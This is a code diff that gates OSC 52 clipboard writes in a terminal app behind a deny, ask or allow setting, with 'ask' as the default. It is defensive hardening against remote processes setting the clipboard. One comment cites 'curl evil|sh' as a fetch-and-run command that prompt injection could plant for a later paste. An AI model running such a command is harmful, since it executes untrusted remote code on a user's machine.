@@ -5,6 +5,8 @@ import { Unicode11Addon } from '@xterm/addon-unicode11'
 import { SearchAddon } from '@xterm/addon-search'
 import { ImageAddon } from '@xterm/addon-image'
 import { ClipboardAddon, Base64 } from '@xterm/addon-clipboard'
+import { ElMessageBox } from 'element-plus'
+import { t } from '../i18n'
 import { ProgressAddon, type IProgressState } from '@xterm/addon-progress'
 import { getXtermTheme } from '../composables/useTerminal'
 import { resolveXtermBackground, applyTerminalBgVar, resolveTerminalThemeName } from '../composables/useTerminalTheme'
@@ -295,6 +297,36 @@ function getHolding(sessionId: string): HTMLDivElement {
   return el
 }
 
+// handleOsc52ClipboardWrite applies the OSC 52 write policy (F-12.5):
+// 'deny' drops the write, 'ask' (default) prompts the user first, 'allow'
+// writes directly (the pre-F-12.5 behavior). Runs detached — the addon's
+// writeText is fire-and-forget.
+async function handleOsc52ClipboardWrite(text: string): Promise<void> {
+  let mode: string
+  try {
+    mode = useSettingsStore().settings.terminal.osc52Clipboard || 'ask'
+  } catch {
+    mode = 'ask' // store unavailable → fail closed
+  }
+  if (mode === 'deny') return
+  if (mode === 'ask') {
+    try {
+      await ElMessageBox.confirm(t('terminal.osc52AskMsg'), t('terminal.osc52Title'), {
+        type: 'warning',
+        confirmButtonText: t('common.confirm'),
+        cancelButtonText: t('common.cancel'),
+      })
+    } catch {
+      return // declined or dismissed — clipboard untouched
+    }
+  }
+  try {
+    await navigator.clipboard.writeText(text)
+  } catch {
+    // non-critical (window unfocused etc.)
+  }
+}
+
 export function acquireTerminal(
   sessionId: string,
   ref: string,
@@ -379,12 +411,14 @@ export function acquireTerminal(
     // not catch provider promise rejections (verified in its source), so a
     // rejected read would surface as an unhandled rejection, and refusing to
     // read also keeps remote processes from exfiltrating local clipboard
-    // contents. Writes swallow failures (window unfocused etc.) for the
-    // same unhandled-rejection reason.
+    // contents. Writes are gated by settings.terminal.osc52Clipboard
+    // (F-12.5, default ask): the remote side choosing our clipboard content
+    // is exactly how a prompt injection plants `curl evil|sh` for a later
+    // paste. Failures stay swallowed for the same unhandled-rejection reason.
     const clipboardAddon = new ClipboardAddon(new Base64(), {
       readText: () => '',
       writeText: (_selection, text) => {
-        navigator.clipboard.writeText(text).catch(() => { /* non-critical */ })
+        void handleOsc52ClipboardWrite(text)
       },
     })
     // ConEmu-style OSC 9;4 progress, surfaced as a tab-bar indicator.
